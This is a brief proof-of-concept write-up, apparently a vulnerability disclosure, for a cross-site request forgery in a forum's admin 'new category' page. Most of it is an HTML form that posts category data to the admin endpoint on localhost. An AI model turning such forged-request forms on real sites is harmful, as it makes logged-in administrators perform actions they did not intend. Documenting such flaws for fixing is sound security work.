# New Category CSRF
Allows to create new forum categories through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/new_category.php" method="POST" style="padding: 25px;">
   <label for="cat_title">Title</label>
   <input type="text" name="cat_title" id="cat_title" class="form-control">
   <label for="cat_desc">Description</label>
   <textarea name="cat_desc" id="cat_desc" class="form-control"></textarea>
   <br>
   <label for="allowed_usergroups">Allowed Usergroups</label>
   <br>
   <input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2" checked=""> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
   <br>
   <input type="submit" name="create" value="Create Category" class="btn btn-default">
</form>
```
